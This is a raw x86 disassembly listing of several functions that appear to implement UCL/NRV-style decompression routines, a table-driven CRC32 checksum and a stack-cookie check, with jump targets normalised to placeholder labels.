mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx 0x1
nop
cmp esi [ ebp + 0xc ]
jae r-xdata
test edx edx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx 0x1000002
ja r-xdata
lea ebx [ edx + ebx * 2 ]
cmp esi [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ esi + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc esi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov [ ebp - 0x8 ] ebx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
cmp ebx 0x2
jne r-xdata
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
cmp esi [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
shr edx 0x1f
mov ecx 0x1f
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
dec ecx
mov edx eax
shr edx cl
and edx 0x1
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edx [ esi + edi ]
add ebx 0xfffffffd
shl ebx 0x8
add edx ebx
inc esi
cmp edx 0xffffffff
je r-xdata
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
jmp r-xdata
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
mov ebx edx
not ebx
shr edx 0x1
and ebx 0x1
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] edx
test ebx ebx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edi eax
shr edi 0x1f
add esi 0x4
inc edi
mov ecx 0x1f
mov [ ebp - 0x4 ] edi
jmp r-xdata
dec ecx
mov edi eax
shr edi cl
and edi 0x1
inc edi
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov ebx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
mov edi 0x500
cmp edi edx
mov edi [ ebp - 0x4 ]
sbb ebx ebx
neg ebx
add edi ebx
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
add edi ebx
cmp edi [ ebp - 0xc ]
ja r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edi eax
shr edi 0x1f
add esi 0x4
add edi 0x3
mov ecx 0x1f
mov [ ebp - 0x4 ] edi
jmp r-xdata
dec ecx
mov edi eax
shr edi cl
and edi 0x1
add edi 0x3
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp edx ebx
ja r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
sub edi edx
add edi [ ebp + 0x10 ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x8 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x8 ]
mov [ ebx + edi - 0x1 ] dl
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx [ ebp - 0xc ]
jae r-xdata
lea edx [ edx + ebx * 2 ]
mov [ ebp - 0x4 ] edx
cmp esi [ ebp + 0xc ]
jae r-xdata
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
inc [ ebp - 0x8 ]
mov [ ebx + edi ] dl
inc ebx
dec [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0x3
mov edx [ ebp - 0x14 ]
test edx edx
je r-xdata
sub_408d00
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push ebx
mov ebx [ ebp + 0x8 ]
add ebx eax
push esi
xor esi esi
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp + 0x8 ] ebx
cmp edx ebx
jb r-xdata
test cl 0x7f
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
mov [ eax ] ecx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
mov edi edi
cmp eax ebx
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1000002
ja r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp esi eax
ja r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop esi
mov [ eax ] edx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] esi
pop esi
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc eax
jmp r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
cmp eax ebx
jae r-xdata
mov ebx [ ebp - 0xc ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop esi
mov [ edx ] ecx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
cmp eax ebx
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea ebx [ ecx + 0x1 ]
mov [ ebp - 0xc ] ebx
test esi esi
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test dl 0x7f
je r-xdata
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
and edx 0x1
inc eax
inc edx
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
inc edx
jmp r-xdata
mov edx 0x1
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
mov esi 0x500
cmp esi ebx
sbb esi esi
neg esi
add edx esi
mov esi [ ebp - 0x4 ]
add edx esi
cmp edx [ ebp - 0x8 ]
ja r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
jmp r-xdata
add ecx ecx
mov edx ecx
shr edx 0x8
and edx 0x1
jmp r-xdata
cmp ebx esi
ja r-xdata
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
add edx 0x3
mov edx [ ebp + 0xc ]
mov [ edx ] esi
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x4 ] edx
cmp edx eax
ja r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop esi
mov [ eax ] edx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
mov [ eax ] edx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
test ecx 0x100
je r-xdata
sub_409010
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ esi ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
add ebx eax
push edi
xor edi edi
xor ecx ecx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] 0x1
mov [ ebp + 0x8 ] ebx
cmp [ ebp - 0x8 ] ebx
jb r-xdata
add ecx ecx
test cx cx
jne r-xdata
pop edi
mov [ esi ] ecx
pop esi
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea ecx [ ecx ]
cmp eax ebx
jae r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea ebx [ ecx + edi * 2 ]
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov edx [ ebp + 0xc ]
mov [ edx ] edi
pop edi
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx 0x1000002
ja r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] edi
pop edi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp edi eax
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
add esi esi
test si si
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] edi
pop edi
pop esi
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x4 ] edi
inc eax
jmp r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
cmp ebx 0x2
jne r-xdata
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
cmp eax edi
jae r-xdata
mov ecx [ ebp - 0x10 ]
add esi esi
mov [ ebp - 0xc ] ecx
test si si
je r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + ebx * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx edi [ eax + edx ]
add ebx 0xfffffffd
shl ebx 0x8
add edi ebx
inc eax
cmp edi 0xffffffff
je r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov ecx esi
shr ecx 0x10
and ecx 0x1
jmp r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
jmp r-xdata
lea esi [ ecx + ecx ]
test si si
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
mov ecx edi
not ecx
shr edi 0x1
and ecx 0x1
inc edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edi
test ecx ecx
lea ecx [ esi + esi ]
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test cx cx
jne r-xdata
test cx cx
jne r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + 0x1 ]
jmp r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
add ecx ecx
test cx cx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov esi 0x500
cmp esi [ ebp - 0xc ]
sbb esi esi
neg esi
add esi edi
add esi ebx
cmp esi [ ebp - 0x8 ]
ja r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea edi [ ecx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + 0x3 ]
jmp r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] ebx
ja r-xdata
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
cmp esi eax
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] esi
pop esi
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov edi esi
jmp r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
lea esi [ ecx + ecx ]
test si si
jne r-xdata
add edi 0x3
sub_4093b0
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0xc ]
mov esi [ esi ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp - 0xc ]
add esi edx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp + 0x8 ] esi
cmp edi esi
jb r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov edi 0x1
lea ebx [ ebx ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
test esi esi
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
cmp esi edi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
cmp edi 0x1000002
ja r-xdata
lea edi [ esi + edi * 2 ]
mov [ ebp - 0x8 ] edi
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
cmp esi edx
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] esi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc edx
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
cmp edi 0x2
jne r-xdata
test ecx ecx
je r-xdata
test esi esi
jne r-xdata
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x8 ] esi
test ecx ecx
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
shr esi 0x1f
mov ecx 0x1f
lea edi [ esi + edi * 2 - 0x2 ]
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
lea edi [ esi + edi * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x8 ]
movzx edi [ edx + ebx ]
add esi 0xfffffffd
shl esi 0x8
add edi esi
inc edx
cmp edi 0xffffffff
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
cmp edx eax
jne r-xdata
mov esi edi
not esi
shr edi 0x1
and esi 0x1
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x14 ] edi
test esi esi
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
shr esi 0x1f
add edx 0x4
inc esi
mov ecx 0x1f
mov [ ebp - 0x10 ] esi
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
inc esi
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov edi 0x1
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov esi 0x500
cmp esi [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
sbb edi edi
neg edi
add esi edi
add esi [ ebp - 0x4 ]
mov [ ebp - 0x10 ] esi
cmp esi [ ebp - 0xc ]
ja r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
shr esi 0x1f
add edx 0x4
add esi 0x3
mov ecx 0x1f
mov [ ebp - 0x10 ] esi
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
add esi 0x3
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] esi
ja r-xdata
cmp edi [ ebp - 0xc ]
jae r-xdata
lea edi [ esi + edi * 2 ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] esi
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x10 ]
inc esi
mov [ ebp - 0x4 ] esi
cmp esi edx
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0xc ]
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
add edi 0x3
mov [ ebp - 0x10 ] edi
test esi esi
je r-xdata
sub_409730
test ecx ecx
jne r-xdata
push esi
not eax
cmp edx 0x10
jb r-xdata
xor eax eax
retn
test edx edx
je r-xdata
movzx esi [ ecx ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x1 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x2 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x3 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x4 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x5 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x6 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x7 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x8 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0x9 ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xa ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xb ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xc ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xd ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xe ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
movzx esi [ ecx + 0xf ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
add ecx 0x10
sub edx 0x10
cmp edx 0x10
jae r-xdata
not eax
pop esi
retn
movzx esi [ ecx ]
xor esi eax
and esi 0xff
shr eax 0x8
xor eax [ esi * 4 + r--data ]
inc ecx
dec edx
jne r-xdata
sub_4098e0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp + eax - 0x14 ] al
inc eax
cmp eax 0x10
jl r-xdata
lea eax [ ebp - 0x3d ]
shr eax 0x2
add eax eax
add eax eax
lea ecx [ ebp - 0x40 ]
sub eax ecx
xor ecx ecx
push esi
or esi 0xffffffff
mov edx 0xffff
cmp si dx
sete cl
xor edx edx
cmp esi esi
sete dl
and ecx edx
xor edx edx
cmp eax 0x4
setl dl
and ecx edx
xor edx edx
test eax eax
setns dl
and ecx edx
and ecx 0x1
mov eax ecx
je r-xdata
xor edx edx
xor ecx ecx
sete dl
and eax edx
cmp eax 0x1
jne r-xdata
mov ecx 0x8
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40b946
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
shr ecx 0x2
add ecx ecx
add ecx ecx
lea eax [ ebp - 0x13 ]
sub ecx eax
inc ecx
lea edx [ ebp + ecx - 0x14 ]
test dl 0x3
mov eax 0x0
sete al
lea esi [ ebp - 0x13 ]
cmp edx esi
sbb esi esi
inc esi
and eax esi
cmp ecx 0x5
sbb esi esi
neg esi
and eax esi
cmp ecx 0x1
sbb esi esi
inc esi
and eax esi
and eax 0x1
lea esi [ ebp - 0xf ]
cmp edx esi
sbb esi esi
neg esi
and eax esi
cmp eax 0x1
jne r-xdata
and eax 0x1
dec ecx
jne r-xdata
xor eax eax
cmp eax [ ebp + ecx - 0x10 ]
sbb eax eax
neg eax
xor ecx ecx
